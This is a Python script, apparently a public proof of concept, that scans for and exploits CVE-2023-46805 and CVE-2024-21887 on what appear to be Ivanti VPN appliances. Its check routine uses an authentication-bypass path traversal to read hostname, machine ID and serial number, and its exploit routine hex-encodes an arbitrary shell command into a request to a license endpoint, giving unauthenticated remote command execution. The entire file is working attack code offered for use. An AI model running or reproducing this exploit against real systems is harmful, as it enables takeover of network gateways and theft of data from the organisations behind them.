import argparse
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlencode
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def check_vulnerability(url, proxy):
    try:
        proxies = {"http": proxy, "https": proxy}
        response = requests.get(url+"/api/v1/configuration/users/user-roles/user-role/rest-userrole1/web/web-bookmarks/bookmark", verify=False, proxies=proxies)
        
        if response.status_code == 403 and len(response.text) == 0:
            final_url = f"{url}/api/v1/totp/user-backup-code/%2e%2e/%2e%2e/system/system-information"
            system_info = requests.get(final_url, verify=False, proxies=proxies)
            print("[+] Target is VULNERABLE")
            print("\r\nSYSTEM INFORMATION")
            print("--------------------------")
            print(system_info.json())
            system_info_json = system_info.json()
            print("OS NAME:       "+system_info_json["rollback-partition-information"]["os-name"])
            print("OS VERSION:    "+system_info_json["rollback-partition-information"]["os-version"])
            print("HOSTNAME:      "+system_info_json["system-information"]["host-name"])
            print("MACHINE ID:    "+system_info_json["system-information"]["machine-id"])
            print("SERIAL NUMBER: "+system_info_json["system-information"]["serial-number"])
        else:
            print("[-] Target is NOT VULNERABLE")
    except requests.RequestException as e:
        print(f"Error: {e}")
        print("[!] ERROR")

def exploit_vulnerability(url, cmd, proxy):
        try:
            proxies = {"http": proxy, "https": proxy}
            cmd = ";"+cmd+";"
            hex_str = cmd.encode().hex()
            encoded_str = '%'.join(a+b for a,b in zip(hex_str[::2], hex_str[1::2]))
            payload = "%"+encoded_str+"%0a"
            response = requests.get(url+"/api/v1/totp/user-backup-code/%2e%2e/%2e%2e/license/keys-status/"+payload,  verify=False, proxies=proxies)
            print(response.json)
        except requests.RequestException as e:
            print(f"Error: {e}")
            print("[!] ERROR")

if __name__ == "__main__":
	print("\033[94m==============================================")
	print("CVE-2023-46805 and CVE-2024-21887 Scanner/Exploit")
	print("Twitter: @ramin_karimhani")
	print("==============================================\033[0m")
	parser = argparse.ArgumentParser(description="This script can check or exploit vulnerabilities. If you set --cmd parameter, this script will exploit target URL. If you don't set, this script only checks vulnerabilities exist on target URL.")
	parser.add_argument("--url", required=True, help="URL to check (e.g., https://target.example.com)")
	parser.add_argument("--proxy", help="Proxy URL (e.g., http://proxy.example.com:8080)")
	parser.add_argument("--cmd", help="Run CMD command (e.g., whoami)")
	args = parser.parse_args()
	if '--cmd' in sys.argv:
		exploit_vulnerability(args.url, args.cmd, args.proxy)
	else:
		check_vulnerability(args.url, args.proxy)
